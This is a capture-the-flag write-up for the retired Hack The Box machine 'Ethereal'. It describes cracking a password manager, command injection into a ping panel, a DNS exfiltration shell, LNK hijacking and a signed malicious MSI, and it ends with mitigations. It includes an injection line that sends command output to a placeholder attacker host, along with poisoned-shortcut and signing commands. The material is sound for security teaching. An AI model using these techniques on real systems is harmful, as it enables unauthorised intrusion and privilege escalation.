---
machine: Ethereal
os: Windows
difficulty: Insane
platform: Hack The Box
state: Retired
tags: [windows, ftp, password-manager, command-injection, dns, lnk, msi, privesc]
---

# Ethereal — Hack The Box (Windows)

[🇪🇸 Español](README.md) | **English**

> **State:** Retired. Reference writeup; no real flags or credentials.

## TL;DR

Anonymous FTP exposes disk images with a PasswordBox database and a weak master password. The dump gives credentials for the ping panel on 8080, where command injection provides a DNS shell and later an OpenSSL shell. A writable LNK opened by jorge is poisoned to get his session; `D:\Certs` holds the private CA and a watched MSI directory used by administrator rupal. An MSI signed with that CA runs code as admin.

## Recon

```bash
nmap -Pn -sCV -p21,80,8080 <IP>
```

- `21` anonymous FTP, `80` web and `8080` admin panel.
- FTP contains `DISK1.zip`, `FDISK.zip` and an image labelled `PASSWORDS`.
- The site mentions a ping panel at `ethereal.htb:8080`.

## Enumeration

Mount the FAT image and open the database with PasswordBox's Linux client. The master password is weak and `--dump` extracts users and passwords. Run `hydra` against the 8080 basic auth to validate `alan`'s account.

## Foothold

The panel runs `ping -n 2 <host>`; inject with `&` and confirm with `tcpdump`. PowerShell is unavailable, but `nslookup` and `certutil` work; build a DNS shell to run commands. Then find OpenSSL under `C:\Progra~2\OpenSS~1.0\bin\openssl.exe` and use a double `s_client` with `cmd.exe` between them for an interactive shell.

```bash
# ping panel injection
127.0.0.1 & nslookup <CMD>.<ATTACKER>
# poisoned LNK
python LNKUp/generate.py --host localhost --type ntlm --out vs.lnk --execute 'cmd /c ...'
# signed MSI
signtool sign /f MySPC.pfx /fd sha256 Ethereal.msi
```

## Lateral movement

`C:\Users\Public\Desktop\Shortcuts\Visual Studio 2017.lnk` is writable. Replace it with an LNK running the same double OpenSSL; jorge's script opens the shortcut every few minutes, so the session arrives as `jorge`.

## Privilege escalation

`D:\Certs` contains `MyCA.cer` and `MyCA.pvk`, the CA private key. `D:\DEV\MSIs` has a note from rupal: MSIs dropped there are executed. Create a code-signing certificate, sign an MSI with a custom action and copy it to the directory; rupal runs it as administrator.

## Evidence

- PasswordBox database and `alan` credentials.
- Panel injection and DNS/OpenSSL shell.
- Poisoned LNK and `jorge` session.
- Private CA, signed MSI and `rupal` shell.

## Lessons learned

- Password manager backups are high-value targets.
- A panel concatenating a host into `ping` allows injection.
- LNKs in public directories can be hijacked.
- An accessible private CA lets you sign binaries the system trusts.

## Mitigation and detection

- Avoid anonymous FTP and weak master passwords.
- Parameterize ping and validate the host.
- Restrict writes to shortcuts and deployment directories.
- Protect the CA key and verify MSI origin.

## References

- [0xdf — Ethereal](https://0xdf.gitlab.io/2019/03/09/htb-ethereal.html)
- [IppSec — Ethereal](https://www.youtube.com/watch?v=Bhh5yPHjwUY)
- [Hack The Box — Ethereal](https://app.hackthebox.com/machines/ethereal)
